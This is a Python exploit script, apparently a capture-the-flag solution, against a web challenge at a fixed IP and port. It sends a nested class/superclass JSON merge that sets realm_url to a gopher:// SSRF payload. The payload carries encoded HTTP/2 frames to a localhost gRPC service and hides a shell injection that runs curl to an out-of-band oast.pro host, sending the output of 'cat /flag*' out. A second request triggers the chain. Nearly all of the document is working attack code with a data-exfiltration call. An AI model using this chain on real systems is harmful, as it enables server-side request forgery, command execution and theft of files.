import requests

ADDR = "83.136.249.227:37643"
WH = "cvhhkacdlejh99ku982g6dspunnfqyuet.oast.pro"
PAYLOAD = f"gopher://localhost:50051/_PRI%20%2A%20HTTP/2.0%0D%0A%0D%0ASM%0D%0A%0D%0A%00%00%00%04%00%00%00%00%00%00%00%00%04%01%00%00%00%00%00%00%5C%01%04%00%00%00%01%83%86E%98b%83w%2A%F9%CD%DC%B7%C6%91%EE-%9D%CCB%B1zr%93%AE2%8E%84%CFA%8B%A0%E4%1D%13%9D%09%B8%D8%00%D8%7F_%8B%1Du%D0b%0D%26%3DLMedz%99%9A%CA%C9m%941%DC%2B%BC%BB%8AMedZc%B0%15%DAip%AD%21%7B%FF%40%02te%86M%835%05%B1%1F%00%00%5B%00%01%00%00%00%01%00%00%00%00V%0AP127.0.0.1%3B%20curl%20{WH}/%3Fflag%3D%24%28cat%20/flag%2A%29%20%23%12%0280%00%00%08%06%01%00%00%00%00%02%04%10%10%09%0E%07%07%00%00%04%08%00%00%00%00%00%00%00%00%0E%00%00%08%06%00%00%00%00%00%02%04%10%10%09%0E%07%07"

url_post = f"http://{ADDR}/merge-fates"

headers = {
    "Connection": "keep-alive",
    "Content-Type": "application/json",
}

data_post = {
    "class": {
        "superclass": {
            "realm_url": PAYLOAD
        }
    }
}

response_post = requests.post(url_post, json=data_post, headers=headers)
print(f"POST Response: {response_post.status_code}")
print(response_post.text)


url_get = f"http://{ADDR}/connect-realm"
response_get = requests.get(url_get)
print(response_get.text)
